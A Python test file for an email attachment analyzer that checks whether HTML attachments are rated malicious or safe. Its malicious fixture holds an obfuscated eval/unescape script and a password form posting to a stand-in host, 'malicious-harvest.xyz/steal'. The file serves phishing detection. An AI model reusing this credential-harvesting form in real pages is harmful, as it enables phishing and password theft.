from app.analyzers.attachment_analyzer import AttachmentAnalyzer


def test_html_obfuscated_script():
    analyzer = AttachmentAnalyzer()
    malicious_html = b"""
    <html>
        <body>
            <script>eval(unescape('%61%6c%65%72%74'));</script>
            <form action="http://malicious-harvest.xyz/steal" method="POST">
                <input type="password" name="pw" />
            </form>
        </body>
    </html>
    """
    res = analyzer.analyze(malicious_html, "login.html", "text/html")
    assert res["risk_level"] in ("suspicious", "malicious")
    signal_types = [s["signal_type"] for s in res["indicators"]]
    assert "html_obfuscated_script" in signal_types or "html_external_form" in signal_types


def test_html_clean():
    analyzer = AttachmentAnalyzer()
    clean_html = b"<html><body><h1>Campus Syllabus</h1><p>Welcome to CS101</p></body></html>"
    res = analyzer.analyze(clean_html, "syllabus.html", "text/html")
    assert res["risk_level"] == "safe"

